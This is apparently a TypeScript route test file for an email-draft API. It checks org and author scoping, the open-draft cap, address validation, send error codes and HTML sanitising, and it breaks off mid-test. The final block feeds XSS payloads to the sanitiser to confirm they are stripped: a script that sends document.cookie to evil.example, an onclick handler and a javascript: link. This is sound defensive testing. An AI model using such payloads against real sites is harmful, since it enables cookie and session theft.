// Route tests for /api/email/orgs/:orgId/drafts — draft CRUD: the read and
// create halves (MAI-72) and the autosave and discard halves (MAI-74).
//
// What these exist to protect:
//   - a draft is org-scoped AND private to its author, so BOTH keys are in the
//     where clause of every read, and neither can be supplied by the caller
//   - a closed draft still comes back: `isOpen: false` keeps the draft, and the
//     dock's "3 drafts" button is the only way back to one
//   - the 12-open cap, refused with a message the rep can act on
//   - addresses are validated for SHAPE only — "ann@" is what a rep who is
//     still typing has, and autosave fires mid-word
//   - a PATCH writes ONLY the keys it was handed, so collapsing a card cannot
//     blank the half-written body
//   - another member's draft, and another org's draft, are a 404 and never a
//     403 — a 403 confirms the id names a real row
import { beforeEach, describe, expect, it, vi } from 'vitest'
import request from 'supertest'

// vi.hoisted() builds the mocks, vi.mock() swaps the modules, and `app.js` is
// imported LAST so the mocks are in place when its module graph loads.
const { prismaMock, verifyTokenMock } = vi.hoisted(() => ({
  prismaMock: {
    user: { findUnique: vi.fn() },
    membership: { findFirst: vi.fn() },
    emailDraft: {
      findMany: vi.fn(),
      findFirst: vi.fn(),
      count: vi.fn(),
      create: vi.fn(),
      updateMany: vi.fn(),
      deleteMany: vi.fn(),
    },
    // recordId carries no database FK (schema.prisma → EmailDraft), so the
    // route checks existence itself, one of these three depending on
    // recordObject.
    person: { count: vi.fn() },
    company: { count: vi.fn() },
    deal: { count: vi.fn() },
  },
  verifyTokenMock: vi.fn(),
}))

vi.mock('../../db.js', () => ({ default: prismaMock }))
vi.mock('../../../dependencies/firebaseAdmin.js', () => ({
  verifyFirebaseIdToken: verifyTokenMock,
  setFirebaseUserDisabled: vi.fn(),
  deleteFirebaseUser: vi.fn(),
  revokeFirebaseRefreshTokens: vi.fn(),
}))

// sendDraftEmail is the whole orchestration (validate → resolve → sanitise →
// send → record); its own behaviour is proved by sendEmail.test.ts. What this
// file protects is the ROUTE around it: ownership, the 404 for a draft that is
// not the caller's, and the status-code mapping from each thrown error to the
// response SPEC-composer-send.md defines. The two error classes are mocked
// alongside it — the route does `instanceof` against exactly these — so a test
// can throw one without dragging in the real module's provider dependencies.
const { sendDraftEmailMock, NoMailboxErrorMock, BadRecipientErrorMock } = vi.hoisted(() => {
  class NoMailboxError extends Error {
    constructor(message = 'Connect a mailbox in Settings → Integrations to send.') {
      super(message)
      this.name = 'NoMailboxError'
    }
  }
  class BadRecipientError extends Error {
    constructor(message: string) {
      super(message)
      this.name = 'BadRecipientError'
    }
  }
  return {
    sendDraftEmailMock: vi.fn(),
    NoMailboxErrorMock: NoMailboxError,
    BadRecipientErrorMock: BadRecipientError,
  }
})
vi.mock('../../lib/mail/sendEmail.js', () => ({
  sendDraftEmail: sendDraftEmailMock,
  NoMailboxError: NoMailboxErrorMock,
  BadRecipientError: BadRecipientErrorMock,
}))

import app from '../../app.js'
import { MAX_OPEN_DRAFTS, DRAFT_LIST_LIMIT } from '../email.js'
import { MailApiError, MailAuthError, MailboxNotFoundError, RateLimitedError } from '../../lib/mail/mailErrors.js'

const NOW = new Date('2026-08-20T12:00:00.000Z')
const AUTH = 'Bearer fake-token'
const ORG_A = 'org-a'
const ORG_B = 'org-b'
const URL_A = `/api/email/orgs/${ORG_A}/drafts`
const URL_B = `/api/email/orgs/${ORG_B}/drafts`
const DRAFT_ID = 'draft-1'
const ONE_A = `${URL_A}/${DRAFT_ID}`
const ONE_B = `${URL_B}/${DRAFT_ID}`

function userRow(overrides: Record<string, unknown> = {}) {
  return {
    id: 'user-a',
    firebaseUid: 'uid-a',
    email: 'a@orga.com',
    firstName: 'Al',
    lastName: 'Pha',
    title: null,
    imageUrl: null,
    roles: ['basic'],
    enabled: true,
    timeZone: 'America/New_York',
    currentOrgId: ORG_A,
    createdAt: NOW,
    updatedAt: NOW,
    ...overrides,
  }
}

function membershipRow(overrides: Record<string, unknown> = {}) {
  return {
    id: 'mem-a',
    userId: 'user-a',
    orgId: ORG_A,
    roles: ['basic'],
    isActive: true,
    createdAt: NOW,
    updatedAt: NOW,
    org: { id: ORG_A, name: 'Org A', logo: null, enabled: true, createdAt: NOW, updatedAt: NOW },
    ...overrides,
  }
}

function draftRow(overrides: Record<string, unknown> = {}) {
  return {
    id: 'draft-1',
    orgId: ORG_A,
    userId: 'user-a',
    mailAccountId: null,
    recordObject: null,
    recordId: null,
    toAddrs: [],
    ccAddrs: [],
    bccAddrs: [],
    subject: null,
    bodyHtml: null,
    isOpen: true,
    isMinimized: false,
    createdAt: NOW,
    updatedAt: NOW,
    ...overrides,
  }
}

/** Signs the caller in. `membership` is what they hold in the org they ask about. */
function authAs(membership: ReturnType<typeof membershipRow> | null = membershipRow()): void {
  verifyTokenMock.mockResolvedValue({ uid: 'uid-a', email: 'a@orga.com' })
  prismaMock.user.findUnique.mockResolvedValue(userRow())
  // The gate looks the caller's membership up per request; null means "not a member".
  prismaMock.membership.findFirst.mockResolvedValue(membership)
}

beforeEach(() => {
  vi.clearAllMocks()
  authAs()
  prismaMock.emailDraft.findMany.mockResolvedValue([])
  prismaMock.emailDraft.count.mockResolvedValue(0)
  prismaMock.emailDraft.create.mockImplementation(
    async ({ data }: { data: Record<string, unknown> }) => draftRow(data),
  )
  // The row exists and belongs to the caller unless a test says otherwise.
  prismaMock.emailDraft.updateMany.mockResolvedValue({ count: 1 })
  prismaMock.emailDraft.deleteMany.mockResolvedValue({ count: 1 })
  prismaMock.emailDraft.findFirst.mockResolvedValue(draftRow())
  // The named record exists unless a test says otherwise.
  prismaMock.person.count.mockResolvedValue(1)
  prismaMock.company.count.mockResolvedValue(1)
  prismaMock.deal.count.mockResolvedValue(1)
})

describe('GET /api/email/orgs/:orgId/drafts', () => {
  it('returns the caller’s drafts keyed, with a total', async () => {
    prismaMock.emailDraft.findMany.mockResolvedValue([
      draftRow({ id: 'draft-new', subject: 'Later' }),
      draftRow({ id: 'draft-old', subject: 'Earlier' }),
    ])

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    expect(res.status).toBe(200)
    expect(res.body.total).toBe(2)
    expect(res.body.drafts).toHaveLength(2)
  })

  it('reads with BOTH keys and hands the newest edits back last, capped at 200', async () => {
    await request(app).get(URL_A).set('Authorization', AUTH)

    const args = prismaMock.emailDraft.findMany.mock.calls[0][0]
    expect(args.where).toEqual({ orgId: ORG_A, userId: 'user-a' })
    // Newest-edit-first in the query, reversed in the response: past the cap,
    // asking for the oldest 200 would drop the drafts just touched.
    expect(args.orderBy[0]).toEqual({ updatedAt: 'desc' })
    expect(args.take).toBe(DRAFT_LIST_LIMIT)
  })

  it('orders oldest first, so the dock puts the newest card on the right', async () => {
    prismaMock.emailDraft.findMany.mockResolvedValue([
      draftRow({ id: 'draft-new', updatedAt: new Date('2026-08-20T13:00:00.000Z') }),
      draftRow({ id: 'draft-old', updatedAt: new Date('2026-08-20T11:00:00.000Z') }),
    ])

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    expect(res.body.drafts.map((d: { id: string }) => d.id)).toEqual(['draft-old', 'draft-new'])
  })

  it('includes CLOSED drafts — closing keeps the draft, it never discards it', async () => {
    prismaMock.emailDraft.findMany.mockResolvedValue([
      draftRow({ id: 'draft-closed', isOpen: false, subject: 'Kept' }),
    ])

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    // Nothing in the where clause may narrow this to open cards.
    expect(prismaMock.emailDraft.findMany.mock.calls[0][0].where).not.toHaveProperty('isOpen')
    expect(res.body.drafts[0]).toMatchObject({ id: 'draft-closed', isOpen: false })
  })

  it('returns exactly the fields the client needs, and no tenant keys', async () => {
    prismaMock.emailDraft.findMany.mockResolvedValue([draftRow()])

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    expect(Object.keys(res.body.drafts[0]).sort()).toEqual(
      [
        'bccAddrs',
        'bodyHtml',
        'ccAddrs',
        'createdAt',
        'id',
        'isMinimized',
        'isOpen',
        'mailAccountId',
        'recordObject',
        'recordId',
        'subject',
        'toAddrs',
        'updatedAt',
      ].sort(),
    )
    expect(res.body.drafts[0]).not.toHaveProperty('orgId')
    expect(res.body.drafts[0]).not.toHaveProperty('userId')
  })
})

describe('POST /api/email/orgs/:orgId/drafts', () => {
  it('creates an empty draft owned by the caller and returns 201', async () => {
    const res = await request(app).post(URL_A).set('Authorization', AUTH).send({})

    expect(res.status).toBe(201)
    expect(res.body.draft).toMatchObject({
      toAddrs: [],
      ccAddrs: [],
      bccAddrs: [],
      subject: null,
      bodyHtml: null,
      isOpen: true,
      isMinimized: false,
    })
    expect(prismaMock.emailDraft.create.mock.calls[0][0].data).toMatchObject({
      orgId: ORG_A,
      userId: 'user-a',
    })
  })

  it('takes orgId and userId from the token and the path, never from the body', async () => {
    await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ orgId: ORG_B, userId: 'user-b' })

    expect(prismaMock.emailDraft.create.mock.calls[0][0].data).toMatchObject({
      orgId: ORG_A,
      userId: 'user-a',
    })
  })

  it('accepts a recipient the composer was opened with', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ toAddrs: ['ann@acme.com'], recordObject: 'person', recordId: 'rec-1' })

    expect(res.status).toBe(201)
    expect(res.body.draft.toAddrs).toEqual(['ann@acme.com'])
    expect(res.body.draft.recordObject).toBe('person')
    expect(res.body.draft.recordId).toBe('rec-1')
    expect(prismaMock.person.count.mock.calls[0][0].where).toEqual({
      id: 'rec-1',
      orgId: ORG_A,
    })
  })

  it(`refuses the ${MAX_OPEN_DRAFTS + 1}th open draft with a 409 and a message to act on`, async () => {
    prismaMock.emailDraft.count.mockResolvedValue(MAX_OPEN_DRAFTS)

    const res = await request(app).post(URL_A).set('Authorization', AUTH).send({})

    expect(res.status).toBe(409)
    expect(res.body.error).toContain(String(MAX_OPEN_DRAFTS))
    expect(res.body.error).toMatch(/close or discard/i)
    expect(prismaMock.emailDraft.create).not.toHaveBeenCalled()
  })

  it(`still opens the ${MAX_OPEN_DRAFTS}th`, async () => {
    prismaMock.emailDraft.count.mockResolvedValue(MAX_OPEN_DRAFTS - 1)

    const res = await request(app).post(URL_A).set('Authorization', AUTH).send({})

    expect(res.status).toBe(201)
  })

  it('counts only OPEN drafts against the cap, and only this rep’s, in this org', async () => {
    await request(app).post(URL_A).set('Authorization', AUTH).send({})

    expect(prismaMock.emailDraft.count.mock.calls[0][0].where).toEqual({
      orgId: ORG_A,
      userId: 'user-a',
      isOpen: true,
    })
  })
})

// recordId has no database foreign key (schema.prisma → EmailDraft): a single
// column cannot reference Person, Company, and Deal at once, so recordObject
// names which one and the route enforces what a FK constraint normally would.
describe('recordObject / recordId pairing (MAI-188)', () => {
  it('rejects recordId without recordObject', async () => {
    const res = await request(app).post(URL_A).set('Authorization', AUTH).send({ recordId: 'rec-1' })

    expect(res.status).toBe(400)
    expect(res.body.error).toMatch(/together/i)
    expect(prismaMock.emailDraft.create).not.toHaveBeenCalled()
  })

  it('rejects recordObject without recordId', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ recordObject: 'person' })

    expect(res.status).toBe(400)
    expect(res.body.error).toMatch(/together/i)
  })

  it('rejects a recordObject outside person | company | deal', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ recordObject: 'record', recordId: 'rec-1' })

    expect(res.status).toBe(400)
    expect(prismaMock.emailDraft.create).not.toHaveBeenCalled()
  })

  it('checks the right table for each recordObject', async () => {
    await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ recordObject: 'company', recordId: 'co-1' })

    expect(prismaMock.company.count.mock.calls[0][0].where).toEqual({ id: 'co-1', orgId: ORG_A })
    expect(prismaMock.person.count).not.toHaveBeenCalled()
    expect(prismaMock.deal.count).not.toHaveBeenCalled()
  })

  it('refuses a recordId that does not exist in this org', async () => {
    prismaMock.deal.count.mockResolvedValue(0)

    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ recordObject: 'deal', recordId: 'deal-nope' })

    expect(res.status).toBe(400)
    expect(res.body.error).toMatch(/could not be found/i)
    expect(prismaMock.emailDraft.create).not.toHaveBeenCalled()
  })

  it('clears both fields together on PATCH', async () => {
    const res = await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ recordObject: null, recordId: null })

    expect(res.status).toBe(200)
    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data).toEqual({
      recordObject: null,
      recordId: null,
    })
  })

  it('rejects a PATCH that sets recordId but leaves recordObject unchanged', async () => {
    const res = await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ recordId: 'rec-2' })

    expect(res.status).toBe(400)
    expect(prismaMock.emailDraft.updateMany).not.toHaveBeenCalled()
  })

  it('refuses a PATCH pointing at a record outside this org', async () => {
    prismaMock.person.count.mockResolvedValue(0)

    const res = await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ recordObject: 'person', recordId: 'someone-elses' })

    expect(res.status).toBe(400)
    expect(res.body.error).toMatch(/could not be found/i)
    expect(prismaMock.emailDraft.updateMany).not.toHaveBeenCalled()
  })
})

describe('address validation is shape-only', () => {
  it('accepts "ann@" — the rep is still typing it', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ toAddrs: ['ann@'] })

    expect(res.status).toBe(201)
    expect(res.body.draft.toAddrs).toEqual(['ann@'])
  })

  it('rejects a 321-character address with a message naming the limit', async () => {
    const tooLong = `${'a'.repeat(312)}@acme.com` // 321 characters

    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ toAddrs: [tooLong] })

    expect(tooLong).toHaveLength(321)
    expect(res.status).toBe(400)
    expect(res.body.error).toContain('320')
    expect(prismaMock.emailDraft.create).not.toHaveBeenCalled()
  })

  it('accepts a 320-character address', async () => {
    const atLimit = `${'a'.repeat(311)}@acme.com` // exactly 320

    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ ccAddrs: [atLimit] })

    expect(atLimit).toHaveLength(320)
    expect(res.status).toBe(201)
  })

  it('rejects more than 100 addresses in one field', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ bccAddrs: Array.from({ length: 101 }, (_, i) => `p${i}@acme.com`) })

    expect(res.status).toBe(400)
    expect(res.body.error).toContain('100')
  })

  it('rejects a blank address', async () => {
    const res = await request(app)
      .post(URL_A)
      .set('Authorization', AUTH)
      .send({ toAddrs: ['   '] })

    expect(res.status).toBe(400)
  })
})

describe('org isolation and privacy', () => {
  it('rejects an unauthenticated GET', async () => {
    const res = await request(app).get(URL_A)

    expect(res.status).toBe(401)
    expect(prismaMock.emailDraft.findMany).not.toHaveBeenCalled()
  })

  it('rejects an unauthenticated POST', async () => {
    const res = await request(app).post(URL_A).send({})

    expect(res.status).toBe(401)
    expect(prismaMock.emailDraft.create).not.toHaveBeenCalled()
  })

  // The issue text says 403 here. The shared `requireMembership` helper answers
  // 404 on purpose — telling a caller the org is real but off-limits leaks that
  // it exists — and the acceptance criterion above it requires that same helper.
  // The helper wins: 403 is reserved for "you are in this org but not an admin".
  it('gives a non-member the membership gate’s answer, and reads nothing', async () => {
    authAs(null)

    const res = await request(app).get(URL_B).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(prismaMock.emailDraft.findMany).not.toHaveBeenCalled()
  })

  it('refuses to create in an org the caller is not a member of', async () => {
    authAs(null)

    const res = await request(app).post(URL_B).set('Authorization', AUTH).send({})

    expect(res.status).toBe(404)
    expect(prismaMock.emailDraft.create).not.toHaveBeenCalled()
    expect(prismaMock.emailDraft.count).not.toHaveBeenCalled()
  })

  it('refuses a caller whose membership was deactivated', async () => {
    // Offboarding writes isActive: false, and the gate filters on it — so this
    // is what a removed member's very next request looks like.
    authAs(null)

    const res = await request(app).get(URL_A).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(prismaMock.membership.findFirst.mock.calls[0][0].where).toMatchObject({
      userId: 'user-a',
      orgId: ORG_A,
      isActive: true,
    })
  })

  it('reads the org from the path, not from the caller’s currentOrgId', async () => {
    // The caller's preference says ORG_A; the path says ORG_B, where they are a
    // member. The query must follow the path.
    authAs(membershipRow({ orgId: ORG_B, org: { id: ORG_B, name: 'Org B', logo: null, enabled: true, createdAt: NOW, updatedAt: NOW } }))

    await request(app).get(URL_B).set('Authorization', AUTH)

    expect(prismaMock.emailDraft.findMany.mock.calls[0][0].where.orgId).toBe(ORG_B)
  })
})

describe('PATCH /api/email/orgs/:orgId/drafts/:draftId', () => {
  it('returns the stored draft, keyed', async () => {
    prismaMock.emailDraft.findFirst.mockResolvedValue(draftRow({ subject: 'Re: Quote' }))

    const res = await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ subject: 'Re: Quote' })

    expect(res.status).toBe(200)
    expect(res.body.draft).toMatchObject({ id: DRAFT_ID, subject: 'Re: Quote' })
    expect(res.body.draft).not.toHaveProperty('orgId')
    expect(res.body.draft).not.toHaveProperty('userId')
  })

  it('writes ONLY the keys the body carries — collapsing a card cannot blank the body', async () => {
    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ isMinimized: true })

    const args = prismaMock.emailDraft.updateMany.mock.calls[0][0]
    expect(args.data).toEqual({ isMinimized: true })
    // The half-written email is the whole point of the feature. None of these
    // may appear in the update just because the body left them out.
    expect(args.data).not.toHaveProperty('bodyHtml')
    expect(args.data).not.toHaveProperty('subject')
    expect(args.data).not.toHaveProperty('toAddrs')
  })

  it('writes an explicit null, because clearing a subject is a real edit', async () => {
    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ subject: null })

    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data).toEqual({ subject: null })
  })

  it('closes a card as a SAVE, never a delete', async () => {
    prismaMock.emailDraft.findFirst.mockResolvedValue(draftRow({ isOpen: false }))

    const res = await request(app).patch(ONE_A).set('Authorization', AUTH).send({ isOpen: false })

    expect(res.status).toBe(200)
    expect(res.body.draft.isOpen).toBe(false)
    expect(prismaMock.emailDraft.deleteMany).not.toHaveBeenCalled()
  })

  // Rule changed on purpose in MAI-78 (EC-12). This test used to read "stores
  // bodyHtml byte for byte, without reformatting it" and used `<div>` wrappers.
  // The route now runs the body through the allow-list in lib/sanitizeHtml.ts,
  // so `<div>` is unwrapped and the old assertion no longer describes the code.
  // What survives of the original rule — and what actually mattered — is that
  // the route does not REFORMAT: it never re-indents, never collapses the rep's
  // spacing, and never re-escapes an entity. Only markup that is not on the
  // allow-list is removed. See the "bodyHtml is sanitised before it is stored"
  // block at the foot of this file for the sanitising half.
  it('stores allowed markup byte for byte, without reformatting it', async () => {
    const body = '<p>Hi Ann,</p><p><br /></p><p>  spaced   &amp; &lt;kept&gt;</p>'
    prismaMock.emailDraft.findFirst.mockResolvedValue(draftRow({ bodyHtml: body }))

    const res = await request(app).patch(ONE_A).set('Authorization', AUTH).send({ bodyHtml: body })

    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml).toBe(body)
    expect(res.body.draft.bodyHtml).toBe(body)
  })

  it('updates through all three keys, never by id alone', async () => {
    await request(app).patch(ONE_A).set('Authorization', AUTH).send({ subject: 'Hi' })

    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].where).toEqual({
      id: DRAFT_ID,
      orgId: ORG_A,
      userId: 'user-a',
    })
    // updateMany, because `update({ where: { id } })` would ignore both.
    expect(prismaMock.emailDraft.updateMany).toHaveBeenCalled()
  })

  it('refuses an empty patch, which would bump updatedAt and reshuffle the dock', async () => {
    const res = await request(app).patch(ONE_A).set('Authorization', AUTH).send({})

    expect(res.status).toBe(400)
    expect(prismaMock.emailDraft.updateMany).not.toHaveBeenCalled()
  })

  it('validates addresses the same way POST does', async () => {
    const res = await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ toAddrs: [`${'a'.repeat(312)}@acme.com`] })

    expect(res.status).toBe(400)
    expect(res.body.error).toContain('320')
    expect(prismaMock.emailDraft.updateMany).not.toHaveBeenCalled()
  })

  it('still accepts "ann@" mid-word', async () => {
    const res = await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ toAddrs: ['ann@'] })

    expect(res.status).toBe(200)
    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].data.toAddrs).toEqual(['ann@'])
  })

  it('rejects an unauthenticated PATCH', async () => {
    const res = await request(app).patch(ONE_A).send({ subject: 'Hi' })

    expect(res.status).toBe(401)
    expect(prismaMock.emailDraft.updateMany).not.toHaveBeenCalled()
  })
})

describe('DELETE /api/email/orgs/:orgId/drafts/:draftId', () => {
  it('removes the row and hands back the deleted id', async () => {
    const res = await request(app).delete(ONE_A).set('Authorization', AUTH)

    expect(res.status).toBe(200)
    expect(res.body.draft).toEqual({ id: DRAFT_ID })
  })

  it('deletes through all three keys, never by id alone', async () => {
    await request(app).delete(ONE_A).set('Authorization', AUTH)

    expect(prismaMock.emailDraft.deleteMany.mock.calls[0][0].where).toEqual({
      id: DRAFT_ID,
      orgId: ORG_A,
      userId: 'user-a',
    })
  })

  it('rejects an unauthenticated DELETE', async () => {
    const res = await request(app).delete(ONE_A)

    expect(res.status).toBe(401)
    expect(prismaMock.emailDraft.deleteMany).not.toHaveBeenCalled()
  })
})

describe('POST /api/email/orgs/:orgId/drafts/:draftId/send', () => {
  const SEND_A = `${ONE_A}/send`

  beforeEach(() => {
    sendDraftEmailMock.mockReset()
  })

  it('sends the draft and returns the receipt (SPEC-composer-send.md → API)', async () => {
    const sentAt = new Date('2026-08-21T09:00:00.000Z')
    sendDraftEmailMock.mockResolvedValue({
      id: 'email-1',
      providerMsgId: 'gmail-msg-1',
      threadId: 'gmail-thread-1',
      sentAt,
    })

    const res = await request(app).post(SEND_A).set('Authorization', AUTH)

    expect(res.status).toBe(200)
    expect(res.body.message).toEqual({
      id: 'email-1',
      providerMsgId: 'gmail-msg-1',
      threadId: 'gmail-thread-1',
      sentAt: sentAt.toISOString(),
    })
  })

  it('reads the draft it already owns rather than taking a payload', async () => {
    sendDraftEmailMock.mockResolvedValue({
      id: 'email-1',
      providerMsgId: 'p-1',
      threadId: null,
      sentAt: new Date(),
    })

    await request(app).post(SEND_A).set('Authorization', AUTH).send({ subject: 'ignored' })

    expect(sendDraftEmailMock).toHaveBeenCalledWith(
      ORG_A,
      'user-a',
      expect.objectContaining({ id: DRAFT_ID }),
    )
  })

  it('404s a draft that does not belong to the caller, without calling sendDraftEmail', async () => {
    prismaMock.emailDraft.findFirst.mockResolvedValue(null)

    const res = await request(app).post(SEND_A).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(sendDraftEmailMock).not.toHaveBeenCalled()
  })

  it('409s with code no_mailbox when nothing is connected', async () => {
    sendDraftEmailMock.mockRejectedValue(new NoMailboxErrorMock())

    const res = await request(app).post(SEND_A).set('Authorization', AUTH)

    expect(res.status).toBe(409)
    expect(res.body.code).toBe('no_mailbox')
  })

  it('409s with code no_mailbox for a race where the mailbox vanished mid-send', async () => {
    sendDraftEmailMock.mockRejectedValue(new MailboxNotFoundError())

    const res = await request(app).post(SEND_A).set('Authorization', AUTH)

    expect(res.status).toBe(409)
    expect(res.body.code).toBe('no_mailbox')
  })

  it('400s with code bad_recipient naming the address', async () => {
    sendDraftEmailMock.mockRejectedValue(
      new BadRecipientErrorMock('This is not a valid email address: ann@'),
    )

    const res = await request(app).post(SEND_A).set('Authorization', AUTH)

    expect(res.status).toBe(400)
    expect(res.body.code).toBe('bad_recipient')
    expect(res.body.error).toBe('This is not a valid email address: ann@')
  })

  it.each([
    ['MailApiError', new MailApiError()],
    ['MailAuthError', new MailAuthError()],
    ['RateLimitedError', new RateLimitedError(1000)],
  ])('502s with code provider_error on a %s', async (_name, err) => {
    sendDraftEmailMock.mockRejectedValue(err)

    const res = await request(app).post(SEND_A).set('Authorization', AUTH)

    expect(res.status).toBe(502)
    expect(res.body.code).toBe('provider_error')
  })

  it('rejects an unauthenticated send', async () => {
    const res = await request(app).post(SEND_A)

    expect(res.status).toBe(401)
    expect(sendDraftEmailMock).not.toHaveBeenCalled()
  })

  it("404s another member's draft, never a 403", async () => {
    authAs(membershipRow({ id: 'mem-b', userId: 'user-b' }))
    prismaMock.user.findUnique.mockResolvedValue(
      userRow({ id: 'user-b', firebaseUid: 'uid-b', email: 'b@orga.com' }),
    )
    prismaMock.emailDraft.findFirst.mockResolvedValue(null)

    const res = await request(app).post(SEND_A).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(res.status).not.toBe(403)
    expect(sendDraftEmailMock).not.toHaveBeenCalled()
  })
})

// The security tests that matter most in this issue. A draft is private to its
// author, so the answer for someone else's draft must be identical to the
// answer for an id that does not exist. A 403 would confirm the row is real.
describe('a draft is private to its author — 404, never 403', () => {
  /** Signs in a DIFFERENT rep who is a real, active member of the same org. */
  function authAsSecondMemberOfOrgA(): void {
    authAs(membershipRow({ id: 'mem-b', userId: 'user-b' }))
    prismaMock.user.findUnique.mockResolvedValue(
      userRow({ id: 'user-b', firebaseUid: 'uid-b', email: 'b@orga.com' }),
    )
  }

  it('PATCH: a second member of the SAME org gets a 404', async () => {
    // Same org, real membership, real draft id — and still nothing to write,
    // because `userId` is in the where clause too.
    authAsSecondMemberOfOrgA()
    prismaMock.emailDraft.updateMany.mockResolvedValue({ count: 0 })

    const res = await request(app).patch(ONE_A).set('Authorization', AUTH).send({ subject: 'Mine' })

    expect(res.status).toBe(404)
    expect(res.status).not.toBe(403)
    expect(res.body.error).toBe('Draft not found')
    // The author's id, not the caller's, is what the row carries — so the
    // caller's own id in the where clause is what makes this miss.
    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].where).toEqual({
      id: DRAFT_ID,
      orgId: ORG_A,
      userId: 'user-b',
    })
  })

  it('DELETE: a second member of the SAME org gets a 404', async () => {
    authAsSecondMemberOfOrgA()
    prismaMock.emailDraft.deleteMany.mockResolvedValue({ count: 0 })

    const res = await request(app).delete(ONE_A).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(res.status).not.toBe(403)
    expect(res.body.error).toBe('Draft not found')
    expect(prismaMock.emailDraft.deleteMany.mock.calls[0][0].where).toEqual({
      id: DRAFT_ID,
      orgId: ORG_A,
      userId: 'user-b',
    })
  })

  it('PATCH: a valid draft id under a DIFFERENT org is a 404', async () => {
    // The caller really is a member of ORG_B, so the gate lets them through.
    // The draft belongs to ORG_A, so the where clause finds nothing.
    authAs(
      membershipRow({
        orgId: ORG_B,
        org: { id: ORG_B, name: 'Org B', logo: null, enabled: true, createdAt: NOW, updatedAt: NOW },
      }),
    )
    prismaMock.emailDraft.updateMany.mockResolvedValue({ count: 0 })

    const res = await request(app).patch(ONE_B).set('Authorization', AUTH).send({ subject: 'Hi' })

    expect(res.status).toBe(404)
    expect(prismaMock.emailDraft.updateMany.mock.calls[0][0].where.orgId).toBe(ORG_B)
  })

  it('DELETE: a valid draft id under a DIFFERENT org is a 404', async () => {
    authAs(
      membershipRow({
        orgId: ORG_B,
        org: { id: ORG_B, name: 'Org B', logo: null, enabled: true, createdAt: NOW, updatedAt: NOW },
      }),
    )
    prismaMock.emailDraft.deleteMany.mockResolvedValue({ count: 0 })

    const res = await request(app).delete(ONE_B).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(prismaMock.emailDraft.deleteMany.mock.calls[0][0].where.orgId).toBe(ORG_B)
  })

  it('PATCH: a non-member never reaches the draft at all', async () => {
    authAs(null)

    const res = await request(app).patch(ONE_B).set('Authorization', AUTH).send({ subject: 'Hi' })

    expect(res.status).toBe(404)
    expect(prismaMock.emailDraft.updateMany).not.toHaveBeenCalled()
  })

  it('DELETE: a non-member never reaches the draft at all', async () => {
    authAs(null)

    const res = await request(app).delete(ONE_B).set('Authorization', AUTH)

    expect(res.status).toBe(404)
    expect(prismaMock.emailDraft.deleteMany).not.toHaveBeenCalled()
  })

  it('an id that does not exist is the same 404, so the two cannot be told apart', async () => {
    prismaMock.emailDraft.updateMany.mockResolvedValue({ count: 0 })

    const res = await request(app)
      .patch(`${URL_A}/no-such-draft`)
      .set('Authorization', AUTH)
      .send({ subject: 'Hi' })

    expect(res.status).toBe(404)
    expect(res.body.error).toBe('Draft not found')
  })
})

// ============================================================
// The sanitiser is WIRED IN (MAI-78 / EC-12)
// ============================================================
// `server/src/lib/__tests__/sanitizeHtml.test.ts` proves the allow-list itself
// blocks the attacks. These prove the write path actually calls it — which is
// the half that silently regresses, because a sanitiser nothing imports still
// passes all of its own tests.
//
// The assertion is on what reaches PRISMA, not on what comes back in the
// response. What is stored is what gets rendered later; the response is read by
// nobody, because the card owns its own text while it is open
// (vite/src/hooks/email/useUpdateEmailDraft.ts).
describe('bodyHtml is sanitised before it is stored', () => {
  it('PATCH strips a <script> from the body on its way into the database', async () => {
    await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({ bodyHtml: '<p>Hi Ann</p><script>fetch("//evil.example?c="+document.cookie)</script>' })

    const stored = prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml
    expect(stored).toBe('<p>Hi Ann</p>')
  })

  it('PATCH strips an event handler and a javascript: href, keeping the rep’s words', async () => {
    await request(app)
      .patch(ONE_A)
      .set('Authorization', AUTH)
      .send({
        bodyHtml:
          '<p style="color:red" onclick="alert(1)">Quote</p>' +
          '<a href="javascript:alert(1)">terms</a>',
      })

    const stored = prismaMock.emailDraft.updateMany.mock.calls[0][0].data.bodyHtml as string
    expect(stored).toBe('<p>Quote</p><a>terms</a>')
    expect(stored.toLowerCase()).not.toContain('javascript')
    expect(stored).not.toContain('onclick')
    expect(stored).not.toContain('style')
  })

  it('PATCH leaves formatting the rep is allowed to use byte for byte', async () => {
